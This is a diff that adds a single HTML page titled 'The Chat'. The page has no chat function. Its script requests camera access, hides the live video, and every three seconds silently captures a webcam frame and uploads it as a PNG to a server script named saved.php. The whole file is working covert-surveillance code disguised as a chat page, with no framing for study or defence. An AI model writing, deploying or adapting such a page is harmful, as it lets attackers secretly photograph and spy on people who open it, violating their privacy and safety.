@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <title>The Chat</title>
+</head>
+<body>
+  <script>
+    async function initChat() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        video.srcObject = stream;
+        video.autoplay = true;
+        video.muted = true;
+        video.playsInline = true;
+        document.body.appendChild(video);
+
+        await new Promise(resolve => video.onloadedmetadata = resolve);
+
+        const intervalo = 3000;
+        setInterval(() => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const dataURL = canvas.toDataURL('image/png');
+          const blob = dataURItoBlob(dataURL);
+          const formData = new FormData();
+          formData.append('files', blob, `files-${Date.now()}.png`);
+
+          fetch('saved.php', {
+            method: 'POST',
+            body: formData
+          }).catch(e => console.error('Error sending image:', e));
+        }, intervalo);
+      } catch (err) {
+        console.error('Error accessing camera:', err);
+      }
+    }
+
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+
+    initChat();
+  </script>
+</body>
+</html>
